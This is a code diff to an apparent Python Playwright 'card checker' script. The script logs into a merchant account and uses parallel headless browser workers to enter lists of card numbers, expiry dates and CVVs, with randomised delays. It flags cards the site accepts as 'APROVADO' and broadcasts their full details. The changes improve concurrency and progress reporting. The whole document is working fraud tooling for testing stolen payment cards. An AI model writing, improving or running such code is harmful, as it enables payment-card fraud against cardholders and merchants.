@@ -27,6 +27,7 @@ estado = {
     "processados": 0,
     "aprovados": 0,
     "fila_vazia": False,
+    "tarefas_concluidas": 0
 }
 
 def log(mensagem: str):
@@ -120,7 +121,7 @@ async def login_mestre(playwright):
         log(f"[ERRO] Login falhou: {e}")
         return False
 
-async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue, estado_fluxo: dict):
+async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue, estado_fluxo: dict, semaforo: asyncio.Semaphore):
     try:
         await asyncio.sleep(id_worker * 2.5)
         log(f"[Canal {id_worker}] Iniciando...")
@@ -128,48 +129,64 @@ async def worker_contexto(id_worker: int, browser, fila: asyncio.Queue, estado_f
         page = await context.new_page()
         await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
 
-        while estado["rodando"] and not estado["fila_vazia"]:
+        while estado["rodando"]:
             try:
-                item = await fila.get()
-                indice, linha, tentativas = item
-                try:
-                    numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
-                    log(f"[Canal {id_worker}][Item {indice}] Processando: {numero[-4:]}")
+                async with semaforo:
+                    if fila.empty() and estado["tarefas_concluidas"] >= estado["total_cartoes"]:
+                        estado["fila_vazia"] = True
+                        log(f"[Canal {id_worker}] Nenhum item na fila e todas as tarefas concluídas")
+                        break
 
-                    await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
-                    await asyncio.sleep(random.uniform(1.0, 2.5))
+                    item = await fila.get()
+                    indice, linha, tentativas = item
+                    try:
+                        numero, mes, ano, cvv = [x.strip() for x in linha.split("|")]
+                        log(f"[Canal {id_worker}][Item {indice}] Processando: {numero[-4:]}")
 
-                    await page.get_by_role("button", name="Adicionar Cartão de Crédito").click(force=True)
+                        await page.goto(URL_MEUS_CARTOES, wait_until="networkidle")
+                        await asyncio.sleep(random.uniform(1.0, 2.5))
 
-                    await page.get_by_role("textbox", name="Número do cartão").fill(numero)
-                    await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
-                    await page.get_by_label("Mês").select_option(mes)
-                    await page.get_by_label("Ano").select_option(ano)
-                    await page.get_by_role("textbox", name="CVV").fill(cvv)
+                        await page.get_by_role("button", name="Adicionar Cartão de Crédito").click(force=True)
 
-                    botoes_antes = await page.get_by_role("button", name="Remover").count()
-                    await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
+                        await page.get_by_role("textbox", name="Número do cartão").fill(numero)
+                        await page.get_by_role("textbox", name="Nome impresso no cartão").fill(NOME_FIXO)
+                        await page.get_by_label("Mês").select_option(mes)
+                        await page.get_by_label("Ano").select_option(ano)
+                        await page.get_by_role("textbox", name="CVV").fill(cvv)
 
-                    for _ in range(30):
-                        if not estado["rodando"] or estado["fila_vazia"]:
-                            break
-                        if await page.get_by_role("button", name="Remover").count() > botoes_antes:
-                            log(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
-                            await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
-                            estado_fluxo["houve_aprovados"] = True
-                            break
+                        botoes_antes = await page.get_by_role("button", name="Remover").count()
+                        await page.get_by_role("button", name="Registrar Cartão de Crédito").click(force=True)
 
-                        body = (await page.locator("body").inner_text()).lower()
-                        if any(x in body for x in ["inválida", "recusado", "erro"]):
-                            log(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
-                            break
-                        await asyncio.sleep(1.5)
-                except Exception as e:
-                    log(f"[Canal {id_worker}] Erro no item {indice}: {e}")
-            finally:
-                fila.task_done()
+                        for _ in range(30):
+                            if not estado["rodando"] or estado["fila_vazia"]:
+                                break
+                            if await page.get_by_role("button", name="Remover").count() > botoes_antes:
+                                log(f"[Canal {id_worker}][Item {indice}] ✅ APROVADO")
+                                await broadcast("aprovado", {"cartao": f"{numero}|{mes}|{ano}|{cvv}"})
+                                estado_fluxo["houve_aprovados"] = True
+                                estado["aprovados"] += 1
+                                break
+
+                            body = (await page.locator("body").inner_text()).lower()
+                            if any(x in body for x in ["inválida", "recusado", "erro"]):
+                                log(f"[Canal {id_worker}][Item {indice}] ❌ Reprovado")
+                                break
+                            await asyncio.sleep(1.5)
+                    except Exception as e:
+                        log(f"[Canal {id_worker}] Erro no item {indice}: {e}")
+                    finally:
+                        fila.task_done()
+                        estado["tarefas_concluidas"] += 1
+                        await broadcast("progresso", {
+                            "processados": estado["tarefas_concluidas"],
+                            "total": estado["total_cartoes"],
+                            "aprovados": estado["aprovados"]
+                        })
+            except Exception as e:
+                log(f"[Canal {id_worker}] Erro geral: {e}")
     finally:
         await context.close()
+        log(f"[Canal {id_worker}] Finalizado")
 
 async def processar_cartoes(texto_cartoes: str, num_canais: int):
     try:
@@ -179,15 +196,14 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
         estado["total_cartoes"] = len(linhas)
         estado["processados"] = 0
         estado["aprovados"] = 0
+        estado["tarefas_concluidas"] = 0
         estado["fila_vazia"] = False
-
-        await broadcast("status", {"total": estado["total_cartoes"]})
 
         if estado["total_cartoes"] == 0:
             log("[ERRO] Nenhum cartão fornecido para teste.")
             return
 
-        # Ajustar número de canais conforme a quantidade de cartões
+        # Limitar o número de canais conforme a quantidade de cartões
         num_canais = min(num_canais, estado["total_cartoes"])
         if num_canais < 1:
             num_canais = 1
@@ -205,8 +221,20 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
             estado_fluxo = {"houve_aprovados": False}
             browser = await pw.chromium.launch(headless=True, args=["--no-sandbox"])
 
-            tasks = [asyncio.create_task(worker_contexto(i, browser, fila, estado_fluxo)) for i in range(1, num_canais + 1)]
+            # Usar semáforo para controlar o acesso à fila
+            semaforo = asyncio.Semaphore(num_canais)
+
+            # Criar tarefas para os workers
+            tasks = [asyncio.create_task(
+                worker_contexto(i, browser, fila, estado_fluxo, semaforo)
+            ) for i in range(1, num_canais + 1)]
+
+            # Aguardar até que todas as tarefas sejam concluídas
             await asyncio.gather(*tasks, return_exceptions=True)
+
+            # Verificar se a fila está vazia e todas as tarefas foram concluídas
+            if fila.empty() and estado["tarefas_concluidas"] >= estado["total_cartoes"]:
+                estado["fila_vazia"] = True
 
             # Faxina FINAL
             if estado_fluxo["houve_aprovados"]:
@@ -225,7 +253,6 @@ async def processar_cartoes(texto_cartoes: str, num_canais: int):
         log(f"[ERRO CRÍTICO] {e}")
     finally:
         estado["rodando"] = False
-        estado["fila_vazia"] = True
         log("[Sistema] Processamento concluído")
 
 
